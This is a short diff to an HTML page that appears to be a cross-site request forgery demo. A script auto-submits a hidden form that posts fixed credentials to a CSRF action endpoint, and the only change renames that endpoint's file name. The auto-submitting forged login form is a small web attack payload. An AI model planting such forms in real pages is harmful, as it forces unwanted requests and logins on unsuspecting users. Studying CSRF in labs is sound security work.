@@ -20,7 +20,7 @@
     document.onload = function() { document.getElementById('login').submit(); }
 </script>
 
-<form method=POST action="csrf_action.php" id="login">
+<form method=POST action="csfr_action.php" id="login">
     <input type=hidden name=username value=host></input>
     <br>
     <input type=hidden name=pword value=pass></input>
